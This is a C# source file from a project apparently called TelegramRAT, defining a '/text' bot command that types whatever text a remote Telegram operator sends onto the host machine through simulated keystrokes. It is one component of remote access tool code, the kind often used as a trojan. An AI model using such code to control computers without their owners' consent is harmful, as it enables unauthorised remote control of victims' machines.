using Telegram.Bot;
using WindowsInput;
using TelegramRAT.Services;

namespace TelegramRAT.Commands.Remote;

public class TextCommand(ITelegramBotClient botClient, IBotNotificationService notificationService) : AbstractBotCommand
{
    public override string Command => "text";
    public override string Description => "Send text input";
    public override int ArgsCount => -2;
    public override string Example => "/text hello world";

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        try
        {
            new KeyboardSimulator(new InputSimulator()).TextEntry(model.RawArgs);
            await botClient.SendMessage(model.Message.Chat.Id, "Done!", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
        }
        catch (Exception ex)
        {
            await notificationService.ReportExceptionAsync(model.Message, ex);
        }
    }
}
